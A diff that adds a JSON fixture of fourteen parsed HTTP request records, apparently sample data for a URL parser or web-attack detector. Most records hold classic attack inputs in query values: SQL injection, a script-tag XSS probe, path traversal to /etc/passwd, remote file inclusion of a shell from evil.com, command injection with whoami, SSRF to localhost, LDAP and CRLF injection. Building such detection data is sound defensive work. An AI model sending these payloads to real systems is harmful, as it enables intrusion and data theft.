@@ -1,0 +1,383 @@
+[
+  {
+    "source_ip": "192.168.1.10",
+    "timestamp": "2026-04-08T10:01:12",
+    "raw_url": "/login?id=1 OR 1=1--",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/login",
+    "path_segments": [
+      "login"
+    ],
+    "path_depth": 1,
+    "query_string": "id=1%20OR%201%3D1--",
+    "query_params": [
+      {
+        "key": "id",
+        "value": "1 OR 1=1--"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.11",
+    "timestamp": "2026-04-08T10:02:45",
+    "raw_url": "/search?q=<script>alert(1)</script>",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/search",
+    "path_segments": [
+      "search"
+    ],
+    "path_depth": 1,
+    "query_string": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "query_params": [
+      {
+        "key": "q",
+        "value": "<script>alert(1)</script>"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.12",
+    "timestamp": "2026-04-08T10:03:21",
+    "raw_url": "/download?file=../../etc/passwd",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/download",
+    "path_segments": [
+      "download"
+    ],
+    "path_depth": 1,
+    "query_string": "file=..%2F..%2Fetc%2Fpasswd",
+    "query_params": [
+      {
+        "key": "file",
+        "value": "../../etc/passwd"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.13",
+    "timestamp": "2026-04-08T10:04:55",
+    "raw_url": "/index.php?page=../../etc/passwd",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/index.php",
+    "path_segments": [
+      "index.php"
+    ],
+    "path_depth": 1,
+    "query_string": "page=..%2F..%2Fetc%2Fpasswd",
+    "query_params": [
+      {
+        "key": "page",
+        "value": "../../etc/passwd"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "php",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.14",
+    "timestamp": "2026-04-08T10:05:30",
+    "raw_url": "/index.php?page=http://evil.com/shell.php",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/index.php",
+    "path_segments": [
+      "index.php"
+    ],
+    "path_depth": 1,
+    "query_string": "page=http%3A%2F%2Fevil.com%2Fshell.php",
+    "query_params": [
+      {
+        "key": "page",
+        "value": "http://evil.com/shell.php"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "php",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.15",
+    "timestamp": "2026-04-08T10:06:10",
+    "raw_url": "/ping?ip=127.0.0.1;whoami",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/ping",
+    "path_segments": [
+      "ping"
+    ],
+    "path_depth": 1,
+    "query_string": "ip=127.0.0.1%3Bwhoami",
+    "query_params": [
+      {
+        "key": "ip",
+        "value": "127.0.0.1;whoami"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.16",
+    "timestamp": "2026-04-08T10:07:05",
+    "raw_url": "/fetch?url=http://127.0.0.1/admin",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/fetch",
+    "path_segments": [
+      "fetch"
+    ],
+    "path_depth": 1,
+    "query_string": "url=http%3A%2F%2F127.0.0.1%2Fadmin",
+    "query_params": [
+      {
+        "key": "url",
+        "value": "http://127.0.0.1/admin"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.17",
+    "timestamp": "2026-04-08T10:08:22",
+    "raw_url": "/xml",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/xml",
+    "path_segments": [
+      "xml"
+    ],
+    "path_depth": 1,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "POST",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.18",
+    "timestamp": "2026-04-08T10:09:40",
+    "raw_url": "/login?user=*)(|(user=*))",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/login",
+    "path_segments": [
+      "login"
+    ],
+    "path_depth": 1,
+    "query_string": "user=%2A%29%28%7C%28user%3D%2A%29%29",
+    "query_params": [
+      {
+        "key": "user",
+        "value": "*)(|(user=*))"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.19",
+    "timestamp": "2026-04-08T10:10:12",
+    "raw_url": "/page?name=abc%0d%0aSet-Cookie:malicious=true",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/page",
+    "path_segments": [
+      "page"
+    ],
+    "path_depth": 1,
+    "query_string": "name=abc%0D%0ASet-Cookie%3Amalicious%3Dtrue",
+    "query_params": [
+      {
+        "key": "name",
+        "value": "abc\r\nSet-Cookie:malicious=true"
+      }
+    ],
+    "query_param_count": 1,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.20",
+    "timestamp": "2026-04-08T10:11:55",
+    "raw_url": "/login",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/login",
+    "path_segments": [
+      "login"
+    ],
+    "path_depth": 1,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "POST",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.21",
+    "timestamp": "2026-04-08T10:12:30",
+    "raw_url": "/transfer",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/transfer",
+    "path_segments": [
+      "transfer"
+    ],
+    "path_depth": 1,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "POST",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.22",
+    "timestamp": "2026-04-08T10:13:10",
+    "raw_url": "/api",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/api",
+    "path_segments": [
+      "api"
+    ],
+    "path_depth": 1,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  },
+  {
+    "source_ip": "192.168.1.23",
+    "timestamp": "2026-04-08T10:14:05",
+    "raw_url": "/home",
+    "scheme": "http",
+    "host": "",
+    "port": null,
+    "effective_port": 80,
+    "path": "/home",
+    "path_segments": [
+      "home"
+    ],
+    "path_depth": 1,
+    "query_string": "",
+    "query_params": [],
+    "query_param_count": 0,
+    "fragment": "",
+    "file_extension": "",
+    "method": "GET",
+    "status_code": null,
+    "user_agent": null,
+    "referrer": null,
+    "source": "ipdr"
+  }
+]
